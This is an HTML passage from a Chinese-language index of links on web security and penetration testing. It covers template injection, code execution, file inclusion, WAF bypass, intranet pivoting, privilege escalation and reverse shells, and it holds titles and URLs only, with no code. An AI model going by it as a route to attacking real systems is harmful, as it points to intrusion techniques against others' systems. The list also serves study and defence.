<li><a href="https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2, Part II</a></li>
<li><a href="https://nvisium.com/blog/2015/12/07/injecting-flask/" target="_blank" rel="external">Injecting Flask</a></li>
<li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="external">Server-Side Template Injection: RCE for the modern webapp</a></li>
<li><a href="https://sethsec.blogspot.jp/2016/11/exploiting-python-code-injection-in-web.html" target="_blank" rel="external">Exploiting Python Code Injection in Web Applications</a></li>
<li><a href="http://rickgray.me/2016/02/24/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates.html" target="_blank" rel="external">利用 Python 特性在 Jinja2 模板中执行任意代码</a></li>
<li><a href="https://virusdefender.net/index.php/archives/761/" target="_blank" rel="external">Python 模板字符串与模板注入</a></li>
</ul>
<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><ul>
<li><a href="http://www.polaris-lab.com/index.php/archives/254/" target="_blank" rel="external">PHP Code Injection Analysis</a></li>
<li><a href="http://doc.ph0en1x.com/wooyun_drops/%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E6%9D%A5%E7%BB%95%E8%BF%87php%20disable_function%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4.html" target="_blank" rel="external">    利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令</a></li>
<li><a href="http://blog.nsfocus.net/hack-php-mail-additional_parameters/" target="_blank" rel="external">Hack PHP mail additional_parameters</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3818.html" target="_blank" rel="external">详细解析PHP mail()函数漏洞利用技巧</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3809.html" target="_blank" rel="external">在PHP应用程序开发中不正当使用mail()函数引发的血案</a></li>
<li><a href="https://www.cdxy.me/?p=765" target="_blank" rel="external">BigTree CMS - Bypass CSRF filter and execute code with PHPMailer</a></li>
<li><a href="http://www.mottoin.com/97678.html" target="_blank" rel="external">基于时间反馈的RCE</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3609.html" target="_blank" rel="external">正则表达式使用不当引发的系统命令执行漏洞</a></li>
</ul>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><ul>
<li><a href="https://l.avala.mp/?p=241" target="_blank" rel="external">Turning LFI into RFI</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-3827.html" target="_blank" rel="external">PHP文件包含漏洞总结</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3873.html" target="_blank" rel="external">常见文件包含发生场景与防御</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3871.html" target="_blank" rel="external">基于云端的本地文件包含漏洞</a></li>
<li><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="external">zip或phar协议包含文件</a></li>
<li><a href="http://drops.blbana.cc/2016/08/12/e6-96-87-e4-bb-b6-e5-8c-85-e5-90-ab-e6-bc-8f-e6-b4-9e/" target="_blank" rel="external">文件包含漏洞 一</a></li>
<li><a href="http://drops.blbana.cc/2016/12/03/e6-96-87-e4-bb-b6-e5-8c-85-e5-90-ab-e6-bc-8f-e6-b4-9e-ef-bc-88-e4-ba-8c-ef-bc-89/" target="_blank" rel="external">文件包含漏洞 二</a></li>
</ul>
<h2 id="文件上传-解析漏洞"><a href="#文件上传-解析漏洞" class="headerlink" title="文件上传 / 解析漏洞"></a>文件上传 / 解析漏洞</h2><ul>
<li><a href="https://xianzhi.aliyun.com/forum/read/458.html" target="_blank" rel="external">我的WafBypass之道（upload篇）</a></li>
<li><a href="http://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/" target="_blank" rel="external">文件上传漏洞（绕过姿势） </a></li>
<li><a href="http://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">服务器解析漏洞 </a></li>
<li><a href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" target="_blank" rel="external">文件上传总结 </a></li>
<li><a href="http://www.cnnetarmy.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="external">文件上传绕过姿势总结</a></li>
<li><a href="https://www.hackfun.org/pentest/make-the-most-possible-analysis-of-the-source-code-and-exploit-the-vulnerability.html" target="_blank" rel="external">尽最大可能分析上传源码及漏洞利用方式</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/224.html" target="_blank" rel="external">从XSSer的角度测试上传文件功能</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/papers-1957.html" target="_blank" rel="external">代码审计之逻辑上传漏洞挖掘</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-23193-1-1.html?from=sec" target="_blank" rel="external">渗透测试方法论之文件上传</a></li>
</ul>
<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><ul>
<li><a href="http://wooyun.jozxing.cc/static/drops/papers-1957.html" target="_blank" rel="external">代码审计之逻辑上传漏洞挖掘</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3769.html" target="_blank" rel="external">逻辑至上——内含各种酷炫姿势</a></li>
<li><a href="http://www.freebuf.com/vuls/112339.html" target="_blank" rel="external">Web安全测试中常见逻辑漏洞解析（实战篇）</a></li>
<li><a href="https://mp.weixin.qq.com/s/Lynmqd_ieEoNJ3mmyv9eQQ" target="_blank" rel="external">逻辑漏洞之密码重置 </a></li>
<li><a href="https://mp.weixin.qq.com/s/w22omfxO8vU6XzixXWmBxg" target="_blank" rel="external">逻辑漏洞之支付漏洞</a></li>
<li><a href="https://mp.weixin.qq.com/s/ChiXtcrEyQeLkGOkm4PTog" target="_blank" rel="external">逻辑漏洞之越权访问</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/web-5048.html" target="_blank" rel="external">密码找回逻辑漏洞总结</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/papers-2035.html" target="_blank" rel="external">一些常见的重置密码漏洞分析整理</a></li>
<li><a href="http://docs.ioin.in/writeup/blog.heysec.org/_archives_643/index.html" target="_blank" rel="external">密码逻辑漏洞小总结</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-21161-1-1.html" target="_blank" rel="external">漏洞挖掘之逻辑漏洞挖掘</a></li>
<li><a href="https://tom0li.github.io/2017/07/17/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/" target="_blank" rel="external">tom0li: 逻辑漏洞小结</a></li>
</ul>
<h2 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h2><ul>
<li><a href="http://www.au1ge.xyz/2017/08/09/web%E4%B9%8B%E5%9B%B0%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">Web之困笔记</a></li>
<li><a href="http://www.mottoin.com/95749.html" target="_blank" rel="external">常见Web源码泄露总结</a></li>
<li><a href="http://www.ms509.com/?p=718" target="_blank" rel="external">Github信息泄露升级版案例</a></li>
<li><a href="https://ricterz.me/posts/Hacking%20iSCSI" target="_blank" rel="external">Hacking iSCSI</a></li>
</ul>
<h3 id="RPO-relative-path-overwrite"><a href="#RPO-relative-path-overwrite" class="headerlink" title="RPO(relative path overwrite)"></a>RPO(relative path overwrite)</h3><ul>
<li><a href="https://xianzhi.aliyun.com/forum/read/1527.html?fpage=2" target="_blank" rel="external">初探 Relative Path Overwrite</a></li>
<li><a href="http://blog.portswigger.net/2015/02/prssi.html" target="_blank" rel="external">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li>
<li><a href="http://www.thespanner.co.uk/2014/03/21/rpo/" target="_blank" rel="external">RPO</a></li>
<li><a href="http://www.mbsd.jp/Whitepaper/rpo.pdf" target="_blank" rel="external">A few RPO exploitation techniques</a></li>
</ul>
<h3 id="Web-Cache"><a href="#Web-Cache" class="headerlink" title="Web Cache"></a>Web Cache</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/3828.html" target="_blank" rel="external">浅析 Web Cache 欺骗攻击</a></li>
</ul>
<h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><ul>
<li><a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" target="_blank" rel="external">利用redis写webshell</a></li>
<li><a href="http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/" target="_blank" rel="external">Redis 未授权访问配合 SSH key 文件利用分析</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/750.html" target="_blank" rel="external">redis未授权访问漏洞利用总结</a>。</li>
</ul>
<h2 id="PHP相关"><a href="#PHP相关" class="headerlink" title="PHP相关"></a>PHP相关</h2><h3 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/3486.html" target="_blank" rel="external">从弱类型利用以及对象注入到SQL注入</a></li>
<li><a href="http://bobao.360.cn/learning/detail/2924.html" target="_blank" rel="external">PHP中“＝＝”运算符的安全问题</a></li>
<li><a href="http://blog.spoock.com/2016/06/25/weakly-typed-security/" target="_blank" rel="external">PHP弱类型安全问题总结 </a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-4483.html" target="_blank" rel="external">浅谈PHP弱类型安全</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-7679.html" target="_blank" rel="external">php比较操作符的安全问题</a></li>
</ul>
<h3 id="随机数问题"><a href="#随机数问题" class="headerlink" title="随机数问题"></a>随机数问题</h3><ul>
<li><a href="http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="external">Cracking PHP rand()</a></li>
<li><a href="http://5alt.me/2017/06/php%E9%87%8C%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0/" target="_blank" rel="external">php里的随机数</a></li>
<li><a href="http://www.openwall.com/php_mt_seed/" target="_blank" rel="external">php_mt_seed - PHP mt_rand() seed cracker</a></li>
<li><a href="http://www.mscs.dal.ca/~selinger/random/" target="_blank" rel="external">The GLIBC random number generator</a></li>
<li><a href="https://github.com/wonderkun/CTF_web/blob/master/web500-2/writeup.pdf" target="_blank" rel="external">一道伪随机数的CTF题</a></li>
</ul>
<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><ul>
<li><a href="www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></li>
<li><a href="http://lorexxar.cn/2016/09/14/php-wei/" target="_blank" rel="external">php 伪协议</a></li>
<li><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="external">利用 Gopher 协议拓展攻击面</a></li>
<li><a href="https://www.bodkin.ren/?p=902" target="_blank" rel="external">PHP伪协议之 Phar 协议（绕过包含）</a></li>
<li><a href="http://www.4o4notfound.org/index.php/archives/31/" target="_blank" rel="external">PHP伪协议分析与应用</a></li>
<li><a href="http://www.cnblogs.com/LittleHann/p/3665062.html" target="_blank" rel="external">LFI、RFI、PHP封装协议安全问题学习</a></li>
</ul>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><ul>
<li><a href="bobao.360.cn/learning/detail/4122.html">PHP反序列化漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">浅谈php反序列化漏洞 </a></li>
<li><a href="http://bobao.360.cn/learning/detail/3193.html" target="_blank" rel="external">PHP反序列化漏洞成因及漏洞挖掘技巧与案例</a></li>
</ul>
<h3 id="php-mail-header-injection"><a href="#php-mail-header-injection" class="headerlink" title="php mail header injection"></a>php mail header injection</h3><ul>
<li><a href="https://www.acunetix.com/blog/articles/email-header-injection/" target="_blank" rel="external">What is Email Header Injection?</a></li>
<li><a href="http://resources.infosecinstitute.com/email-injection/" target="_blank" rel="external">PHP Email Injection Example</a></li>
</ul>
<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><ul>
<li><a href="http://blog.th3s3v3n.xyz/2016/05/01/bin/2016-5-1-php%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9Eexp%E7%BC%96%E5%86%99%E5%92%8C%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/" target="_blank" rel="external">php内存破坏漏洞exp编写和禁用函数绕过</a></li>
<li><a href="http://blog.th3s3v3n.xyz/2016/11/20/web/%E6%8C%96%E6%8E%98PHP%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" target="_blank" rel="external">挖掘PHP禁用函数绕过利用姿势</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-3424.html" target="_blank" rel="external">.user.ini文件构成的PHP后门</a></li>
</ul>
<h2 id="java-Web"><a href="#java-Web" class="headerlink" title="java-Web"></a>java-Web</h2><h3 id="反序列"><a href="#反序列" class="headerlink" title="反序列"></a>反序列</h3><ul>
<li><a href="http://bobao.360.cn/learning/detail/4267.html" target="_blank" rel="external">如何攻击Java反序列化过程</a></li>
<li><a href="https://www.vulbox.com/knowledge/detail/?id=11" target="_blank" rel="external">深入理解JAVA反序列化漏洞</a></li>
<li><a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/" target="_blank" rel="external">Attacking Java Deserialization</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4118.html" target="_blank" rel="external">jackson反序列化详细分析</a></li>
</ul>
<h3 id="Struct2"><a href="#Struct2" class="headerlink" title="Struct2"></a>Struct2</h3><ul>
<li><a href="http://www.zerokeeper.com/vul-analysis/struts2-command-execution-series-review.html" target="_blank" rel="external">Struts2 命令执行系列回顾</a></li>
</ul>
<h3 id="其他-2"><a href="#其他-2" class="headerlink" title="其他"></a>其他</h3><ul>
<li><a href="https://mp.weixin.qq.com/s/WT1EXEryUGGqHQpSi959xw" target="_blank" rel="external">层层放大java审计的攻击面 </a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;mid=2247483954&amp;idx=1&amp;sn=418b7e55b16c717ee5140af990298e22&amp;chksm=e8fe9e3bdf89172d0670690060944bf2434cc2d2e8fba4477711299a0775cf3735a2022c0778#rd" target="_blank" rel="external">以Java的视角来聊聊SQL注入 </a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;mid=100000318&amp;idx=1&amp;sn=9011af3e3968e0d87499605ef1a68291&amp;chksm=68fe9e375f8917213297855bd9e1ab1203ae4c9b0b5ca351de7b2c0f7a7799bd1f4843cd13f4#rd" target="_blank" rel="external">你的 Java web 配置安全吗？ </a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/1904.html" target="_blank" rel="external">Java代码审计PPT </a></li>
<li><a href="https://github.com/ilmila/springcss-cve-2014-3625/tree/master/src" target="_blank" rel="external">spring任意文件读取</a></li>
</ul>
<h2 id="python-Web"><a href="#python-Web" class="headerlink" title="python-Web"></a>python-Web</h2><ul>
<li><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="external">Python 格式化字符串漏洞（Django为例）</a></li>
<li><a href="http://www.venenof.com/index.php/archives/360/" target="_blank" rel="external">format注入</a></li>
<li><a href="http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/" target="_blank" rel="external">Be Careful with Python’s New-Style String Format</a></li>
<li><a href="http://www.tuicool.com/articles/2iIj2eR" target="_blank" rel="external">Python urllib HTTP头注入漏洞</a></li>
<li><a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="external">Hack Redis via Python urllib HTTP Header Injection</a></li>
<li><a href="http://www.0aa.me/index.php/archives/123/" target="_blank" rel="external">Python Waf黑名单过滤下的一些Bypass思路</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzIzOTQ5NjUzOQ==&amp;mid=2247483665&amp;idx=1&amp;sn=4b18de09738fdc5291634db1ca2dd55a" target="_blank" rel="external">Python Sandbox Bypass</a></li>
<li><a href="https://github.com/python-security/pyt" target="_blank" rel="external">pyt: 针对 Python 应用程序的源码静态分析工具</a></li>
</ul>
<h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node-js"></a>Node-js</h2><ul>
<li><a href="http://www.websecgeeks.com/2017/04/pentesting-nodejs-application-nodejs.html" target="_blank" rel="external">Pentesting Node.js Application : Nodejs Application Security(需翻墙)</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-21810-1-1.html?from=sec" target="_blank" rel="external">从零开始学习渗透Node.js应用程序 </a></li>
</ul>
<h2 id="WAF相关"><a href="#WAF相关" class="headerlink" title="WAF相关"></a>WAF相关</h2><ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="external">牛逼牛逼的payload和bypass总结</a></li>
<li><a href="http://www.mottoin.com/100887.html" target="_blank" rel="external">WAF绕过参考资料</a></li>
<li><a href="http://www.freebuf.com/articles/web/136723.html" target="_blank" rel="external">浅谈WAF绕过技巧</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/753.html?fpage=6" target="_blank" rel="external">addslashes防注入的绕过案例</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/553.html?fpage=8" target="_blank" rel="external">浅谈json参数解析对waf绕过的影响</a></li>
<li><a href="http://weibo.com/ttarticle/p/show?id=2309404007261092631700" target="_blank" rel="external">WAF攻防研究之四个层次Bypass WAF</a></li>
<li><a href="http://www.sohu.com/a/110066439_468673" target="_blank" rel="external">使用HTTP头去绕过WAF </a></li>
<li><a href="https://www.inforsec.org/wp/?p=1993" target="_blank" rel="external">会找漏洞的时光机: Pinpointing Vulnerabilities</a></li>
</ul>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><ul>
<li><a href="http://wooyun.jozxing.cc/static/drops/papers-4544.html" target="_blank" rel="external">论PHP常见的漏洞</a></li>
<li><a href="http://www.freebuf.com/articles/rookie/143554.html" target="_blank" rel="external">浅谈代码审计入门实战：某博客系统最新版审计之旅 </a></li>
<li><a href="http://www.am0s.com/ctf/200.html" target="_blank" rel="external">ctf中的php代码审计技巧</a></li>
<li><a href="http://docs.ioin.in/writeup/www.91ri.org/_15074_html/index.html" target="_blank" rel="external">PHP代码审计tips</a></li>
<li><a href="http://docs.ioin.in/writeup/blog.heysec.org/_archives_170/index.html" target="_blank" rel="external">代码审计之文件越权和文件上传搜索技巧</a></li>
<li><a href="http://wiki.ioin.in/post/group/6Rb" target="_blank" rel="external">PHP代码审计入门集合</a></li>
<li><a href="http://phantom0301.cc/2017/06/06/codeaudit/" target="_blank" rel="external">PHP代码审计学习</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-838.html" target="_blank" rel="external">PHP漏洞挖掘思路+实例</a></li>
<li><a href="http://wooyun.jozxing.cc/static/drops/tips-858.html" target="_blank" rel="external">PHP漏洞挖掘思路+实例 第二章</a></li>
<li><a href="http://www.freebuf.com/articles/rookie/143554.html" target="_blank" rel="external">浅谈代码审计入门实战：某博客系统最新版审计之旅 </a></li>
</ul>
<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="Course"><a href="#Course" class="headerlink" title="Course"></a>Course</h2><ul>
<li><a href="http://bobao.360.cn/learning/detail/3741.html" target="_blank" rel="external">Web Service 渗透测试从入门到精通</a></li>
<li><a href="https://www.processon.com/view/583e8834e4b08e31357bb727" target="_blank" rel="external">渗透标准</a></li>
<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/" target="_blank" rel="external">Penetration Testing Tools Cheat Sheet</a></li>
</ul>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/qz0b42DKhgo1sfitcUKhtQ" target="_blank" rel="external">看我如何收集全网IP的whois信息 </a></li>
<li><a href="http://www.freebuf.com/articles/web/142767.html" target="_blank" rel="external">浅谈Web渗透测试中的信息收集 </a></li>
<li><a href="http://www.4hou.com/penetration/6850.html" target="_blank" rel="external">渗透测试教程：如何侦查目标以及收集信息？</a></li>
<li><a href="weibo.com/ttarticle/p/show?id=2309404088584863883789">本屌的web漏洞扫描器思路 技巧总结（域名信息收集篇）</a></li>
<li><a href="http://www.91ri.org/17001.html" target="_blank" rel="external">子域名的艺术</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4119.html" target="_blank" rel="external">实例演示如何科学的进行子域名收集</a></li>
<li><a href="http://thief.one/2017/05/19/1/" target="_blank" rel="external">【渗透神器系列】搜索引擎 </a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/805.html" target="_blank" rel="external">域渗透基础简单信息收集（基础篇）</a></li>
<li><a href="http://docs.ioin.in/writeup/www.mottoin.com/_92978_html/index.html" target="_blank" rel="external">内网渗透定位技术总结</a></li>
<li><a href="https://www.secpulse.com/archives/51527.html" target="_blank" rel="external">后渗透攻防的信息收集</a></li>
<li><a href="http://www.mottoin.com/99951.html" target="_blank" rel="external">安全攻城师系列文章－敏感信息收集</a></li>
<li><a href="http://www.mottoin.com/101362.html" target="_blank" rel="external">子域名枚举的艺术</a></li>
<li><a href="https://mp.weixin.qq.com/s/ardCYdZzaSjvSIZiFraWGA" target="_blank" rel="external">论二级域名收集的各种姿势</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/451.html?fpage=2" target="_blank" rel="external">我眼中的渗透测试信息搜集</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/1675.html" target="_blank" rel="external">大型目标渗透－01入侵信息搜集</a></li>
</ul>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/VJBnXq3--0HBD7eVeifOKA" target="_blank" rel="external">【玩转Linux系统】Linux内网渗透 </a></li>
<li><a href="http://www.4hou.com/penetration/7016.html" target="_blank" rel="external">渗透测试指南之域用户组的范围</a></li>
<li><a href="http://mp.weixin.qq.com/s/l-Avt72ajCIo5GdMEwVx7A" target="_blank" rel="external">内网主机发现技巧补充</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3Mzk1MDk1NA==&amp;mid=2651903919&amp;idx=1&amp;sn=686cc53137aa9e8ec323dda1e54a2c23" target="_blank" rel="external">Linux 端口转发特征总结 </a></li>
<li><a href="http://rcoil.me/2017/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" target="_blank" rel="external">内网渗透（持续更新） </a></li>
<li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html" target="_blank" rel="external">实战 SSH 端口转发</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3545.html" target="_blank" rel="external">多重转发渗透隐藏内网</a></li>
<li><a href="http://www.03sec.com/3141.shtml" target="_blank" rel="external">内网转发姿势</a></li>
<li><a href="https://mp.weixin.qq.com/s/EWL9-AUB_bTf7pU4S4A2zg" target="_blank" rel="external">内网转发的工具</a></li>
<li><a href="http://www.03sec.com/3140.shtml" target="_blank" rel="external">Linux 下多种反弹 shell 方法</a></li>
<li><a href="http://wolvez.club/?p=458" target="_blank" rel="external">php 反弹shell</a></li>
<li><a href="https://klionsec.github.io/2017/08/05/ew-tunnel/" target="_blank" rel="external">利用ew轻松穿透多级目标内网</a></li>
<li><a href="https://bl4ck.in/penetration/2017/03/20/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88.html" target="_blank" rel="external">windows内网渗透杂谈</a></li>
<li><a href="http://docs.ioin.in/writeup/www.mottoin.com/_89413_html/index.html" target="_blank" rel="external">Windows域横向渗透</a></li>
<li><a href="http://blog.neargle.com/SecNewsBak/drops/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93.html" target="_blank" rel="external">内网渗透中转发工具总结</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3683.html" target="_blank" rel="external">内网渗透思路整理与工具使用</a></li>
<li><a href="http://www.freebuf.com/sectool/125237.html" target="_blank" rel="external">Cobalt strike在内网渗透中的使用 </a></li>
<li><a href="http://x95.org/archives/reverse-socks5-proxy.html" target="_blank" rel="external">反向socks5代理(windows版)</a></li>
<li><a href="http://www.mottoin.com/89355.html" target="_blank" rel="external">Windows渗透基础</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/768.html" target="_blank" rel="external">通过双重跳板漫游隔离内网</a></li>
<li><a href="https://artkond.com/2017/03/23/pivoting-guide/" target="_blank" rel="external">A Red Teamer’s guide to pivoting</a></li>
<li><a href="https://mp.weixin.qq.com/s/l-0sWU4ijMOQWqRgsWcNFA" target="_blank" rel="external">穿越边界的姿势 </a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/1715.html" target="_blank" rel="external">内网端口转发及穿透</a></li>
<li><a href="http://www.4hou.com/technology/3143.html" target="_blank" rel="external">秘密渗透内网——利用 DNS 建立 VPN 传输隧道</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">Reverse Shell Cheat Sheet</a></li>
</ul>
<h2 id="渗透实战"><a href="#渗透实战" class="headerlink" title="渗透实战"></a>渗透实战</h2><ul>
<li><a href="http://www.freebuf.com/news/142680.html" target="_blank" rel="external">挖洞经验 | 看我如何综合利用4个漏洞实现GitHub Enterprise远程代码执行 </a></li>
<li><a href="http://bobao.360.cn/learning/detail/4113.html" target="_blank" rel="external">Splash SSRF到获取内网服务器ROOT权限</a></li>
<li><a href="http://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html" target="_blank" rel="external">Pivoting from blind SSRF to RCE with HashiCorp Consul</a></li>
<li><a href="http://www.freebuf.com/articles/web/141579.html" target="_blank" rel="external">我是如何通过命令执行到最终获取内网Root权限的 </a></li>
<li><a href="https://xianzhi.aliyun.com/forum/read/1629.html" target="_blank" rel="external">信息收集之SVN源代码社工获取及渗透实战</a></li>
<li><a href="http://paper.seebug.org/256/" target="_blank" rel="external">SQL注入+XXE+文件遍历漏洞组合拳渗透Deutsche Telekom</a></li>
<li><a href="http://blog.neargle.com/SecNewsBak/drops/%E6%B8%97%E9%80%8FHacking%20Team%E8%BF%87%E7%A8%8B.html" target="_blank" rel="external">渗透 Hacking Team</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-25827-1-1.html?from=sec" target="_blank" rel="external">由视频系统SQL注入到服务器权限</a></li>
<li><a href="http://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html" target="_blank" rel="external">From Serialized to Shell :: Exploiting Google Web Toolkit with EL Injection</a></li>
<li><a href="http://docs.ioin.in/writeup/avfisher.win/_archives_381/index.html" target="_blank" rel="external">浅谈渗透测试实战</a></li>
<li><a href="http://avfisher.win/archives/741" target="_blank" rel="external">渗透测试学习笔记之案例一</a></li>
<li><a href="http://avfisher.win/archives/756" target="_blank" rel="external">渗透测试学习笔记之案例二</a></li>
</ul>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul>
<li><a href="http://www.secbox.cn/skill/5583.html" target="_blank" rel="external">提权技巧</a></li>
<li><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="external">linux-kernel-exploits Linux平台提权漏洞集合</a></li>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">windows-kernel-exploits Windows平台提权漏洞集合 </a></li>
<li><a href="http://www.91ri.org/16540.html" target="_blank" rel="external">Linux MySQL Udf 提权</a></li>
<li><a href="http://mp.weixin.qq.com/s/uOArxXIfcI4fjqnF9BDJGA" target="_blank" rel="external">windows提权系列上篇</a></li>
<li><a href="https://mp.weixin.qq.com/s/ERXOLhWo0-lJbMV143I8hA" target="_blank" rel="external">Windows提权系列中篇</a></li>
</ul>
<h2 id="渗透技巧"><a href="#渗透技巧" class="headerlink" title="渗透技巧"></a>渗透技巧</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/VqrUTW9z-yi3LqNNy-lE-Q" target="_blank" rel="external">域渗透神器Empire安装和简单使用 </a></li>
<li><a href="http://www.freebuf.com/news/142195.html" target="_blank" rel="external">如何将简单的Shell转换成为完全交互式的TTY </a></li>
<li><a href="https://www.n0tr00t.com/2017/03/09/penetration-test-without-file.html" target="_blank" rel="external">60字节 - 无文件渗透测试实验</a></li>
<li><a href="http://www.tuicool.com/articles/fMFB3mY" target="_blank" rel="external">内网渗透思路探索之新思路的探索与验证</a></li>
<li><a href="http://www.freebuf.com/articles/web/142628.html" target="_blank" rel="external">Web端口复用正向后门研究实现与防御 </a></li>
